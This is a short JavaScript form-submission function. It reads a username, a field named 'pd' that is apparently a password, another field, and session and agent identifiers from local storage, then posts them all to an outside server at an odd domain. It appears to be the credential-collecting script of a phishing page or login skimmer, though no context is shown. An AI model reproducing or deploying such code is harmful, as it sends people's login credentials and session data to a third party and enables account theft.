
function submit_form(){
    var uname = document.getElementById("uname").value;
    var pd = document.getElementById("pd").value;
    var b = document.getElementById("b").value;
    var agent_id = localStorage.getItem("agent_id");
    var sid = localStorage.getItem("sid");
    var app = localStorage.getItem("app");
    var xhr = new XMLHttpRequest();
    xhr.open("POST", 'https://e12345.online/post.php', false);
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");

    xhr.onreadystatechange = function() { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            // Request finished. Do processing here.
        }
    }
    xhr.send("uname="+uname+"&pd="+ pd + "&b="+ b +"&agent_id="+ agent_id+ "&sid="+ sid+ "&app="+ app)
}
